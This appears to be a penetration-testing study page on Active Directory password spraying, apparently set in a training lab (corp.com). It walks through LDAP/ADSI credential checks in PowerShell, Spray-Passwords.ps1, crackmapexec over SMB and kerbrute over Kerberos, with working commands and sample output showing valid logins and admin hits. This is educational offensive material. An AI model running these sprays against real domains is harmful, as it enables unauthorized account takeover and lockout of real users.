---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Password Attacks

There was a whole [earlier section](broken-reference) discussing password attacks. Password attacks are also a viable choice in the context of AD to obtain user credentials. Broadly speaking there are 3 methods of conducting password attacks in AD:

1. Via LDAP and ADSI
2. Via SMB
3. Via a Kerberos TGT

Prior to getting started with a password attack, it is helpful to understand the password requirements inside the organization. This can be done with the command:

```sh
net accounts
```

When run this will reveal information about the lockout threshold, duration, and observation window:

```shell-session
```



Once this information has been obtained the attacker can determine which password attack methodology best suits their needs.

## LDAP and ADSI

Similar to how LDAP commands are leveraged in the [Enumerate-AD](../../enumeration/manual.md#enumerate-a-d) PowerShell module, they can be used to check passwords. Basically the snippet looks like this:

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

If the `New-Object` cmdlet succeeds in creating the object (as shown below), that means the password is correct:

```
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```

If the password is incorrect, the constructor for `DirectoryEntry` will fail with an error message:

```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

### Spray-Passwords

With that in mind it is possible to write a script that would query passwords in accordance with the lockout thresholds (in order to stay below it). Fortunately this has already been implemented in [`Spray-Passwords.ps1`](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1). The PowerShell script automatically identifies domain users and sprays a password against them. It is used as shown below:

```powershell
.\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
```

* `-Pass` flag allows the user to pass one or more (comma-separated) passwords to be tested
  * `-File` can be used instead to pass a path to a file containing a password list (one entry per line)
* `-Admins` includes administrator user accounts in the target list
  * Default behavior is to target all active users but skip privileged accounts
  * This flag targets all user accounts including privileged ones

For example to spray Nexus123! against the domain, admin users included the command and output would be:

```powershell
PS C:\Users\jeff> .\Spray-Passwords.ps1 -Pass 'Nexus123!' -Admins
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```

This reveals 2 domain users who have the password `Nexus123!`.

## SMB

The second type of AD password attacks leverages SMB. This is one of the traditional approaches of password attacks in AD and comes with some drawbacks. For example, for every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy due to the generated network traffic. It is also quite slow in comparison to other techniques.

### CrackMapExec

[`crackmapexec`](https://www.kali.org/tools/crackmapexec/) is a tool that can be used for many things including AD password attacks via SMB. It can be used as seen below:

{% code overflow="wrap" %}
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
{% endcode %}

* `smb`: indicates the protocol of choice, SMB
* `192.168.50.75`: the tool can be directed at any SMB-enabled domain-connected machine. The tool is targeted by IP address
* `-u`: indicates a file containing a list of usernames (one per line)
* `-p`: is the password to test
  * Can be set to a file containing a list of passwords instead of a single string if desired
* `-d`: specifies the domain
* `--continue-on-success`: prevents tool from stopping with first success

When used, `crackmapexec` find the same accounts as before:

{% code title="users.txt" %}
```
dave
jen
pete
```
{% endcode %}

```shell-session
kali@kali:~$ crackmapexec smb 192.168.222.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success  
SMB         192.168.222.75  445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.222.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.222.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
SMB         192.168.222.75  445    CLIENT75         [+] corp.com\pete:Nexus123!
```

* Success and failure is indicated by a `[+]` and `[-]` sign respectively

One last item to note is what happens if an account has admin privileges as seen here:

```shell-session
$ crackmapexec smb 192.168.192.75 -u dave -p 'Flowers1' -d corp.com
SMB         192.168.192.75  445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.192.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
```

* `(Pwn3d!)` is added to the output of any account that also has admin privileges

## Kerberos TGT

The third kind of password spraying attack is based on obtaining a TGT. For example, using [`kinit`](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user\_commands/kinit.html) on a Linux system, one can obtain and cache a Kerberos TGT. A username and password will need to be provided to do this. If the credentials are valid, a TGT will be obtained. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.

While using `kinit` could be automated in a bash script or something, there is already a tool that can do this.

### Kerbrute

[Kerbrute](https://github.com/ropnop/kerbrute) is a tool to quickly brute-force and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. It is cross-platform and has

[pre-compiled binaries](https://github.com/ropnop/kerbrute/releases) for both platforms. In this example it will be downloaded to the domain-connected CLIENT75 machine and run from there. The command structure will be:

{% code overflow="wrap" %}
```sh
.\kerbrute.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
{% endcode %}

* \-d specifies the domain
* .\usernames.txt is a file containing a list of usernames (one-per-line)
* "Nexus123!" is the password to spray

When run the output looks like this:

<pre class="language-shell-session"><code class="lang-shell-session">C:\Users\jeff>.\kerbrute.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&#x3C; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/27/24 - Ronnie Flathers @ropnop

2024/03/27 18:12:10 >  Using KDC(s):
2024/03/27 18:12:10 >   dc1.corp.com:88
<strong>2024/03/27 18:12:10 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
</strong>2024/03/27 18:12:10 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2024/03/27 18:12:10 >  Done! Tested 3 logins (2 successes) in 0.023 seconds
</code></pre>

The `passwordspray` command is primarily used to check a large list of users for one or two common passwords. To attack a specific user, the `bruteuser` command would be more apropos.&#x20;
